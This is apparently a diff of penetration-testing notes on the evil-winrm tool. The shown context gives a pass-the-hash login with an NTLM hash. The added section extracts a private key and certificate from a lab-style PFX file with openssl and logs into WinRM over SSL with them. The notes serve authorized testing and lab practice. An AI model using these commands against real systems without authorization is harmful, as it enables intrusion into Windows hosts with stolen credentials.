@@ -27,7 +27,24 @@ You can also use an NTLM hash instead of a password:
 ```bash
 evil-winrm -i 10.10.10.10 -u administrator -H <NTLM_HASH>
 ```
-### Requirements
 
-- **WinRM Enabled**: The target machine must have the WinRM service enabled and configured to accept remote connections. In many Windows Server installations, this is enabled by default, but it is often disabled in more secure environments.
-- **Credentials**: You need valid credentials (username and password or hash) to authenticate on the system.
+
+---
+
+## WinRM Login Using a Certificate (PFX)
+
+If WinRM is exposed over **HTTPS (port 5986)**, a decrypted **PFX** can be used for authentication.
+
+1. **Extract key and certificate**
+
+```bash
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
+openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
+```
+
+2. **Login with Evil‑WinRM (SSL)**
+
+```bash
+evil-winrm -i <TARGET_IP> -c cert.pem -k key.pem -S
+```
+
